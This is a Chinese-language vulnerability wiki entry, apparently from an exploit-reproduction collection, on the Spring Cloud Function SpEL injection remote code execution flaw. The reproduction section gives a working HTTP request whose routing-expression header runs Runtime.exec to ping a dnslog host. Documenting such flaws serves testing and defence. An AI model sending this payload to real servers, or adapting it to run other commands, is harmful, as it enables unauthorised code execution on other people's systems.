# Spring Cloud Function SPEL 远程命令执行漏洞

## 漏洞描述

Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码。

## 漏洞影响

<a-checkbox checked>Spring Cloud Function </a-checkbox></br>

## 环境搭建

```php
https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo
```

## 漏洞复现

搭建后访问

![img](/assets/PeiQi-Wiki/img/1648445963507-0e8edf45-ca97-444a-b9f2-6e1ce7a1c838.png)

发送POC

```php
POST /functionRouter HTTP/1.1
Host: 192.168.1.27:9000
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 dxytoy.dnslog.cn")
Content-Length: 1
```

![img](/assets/PeiQi-Wiki/img/1648446987819-85f1a250-ed53-4794-9168-286030887cc4.png)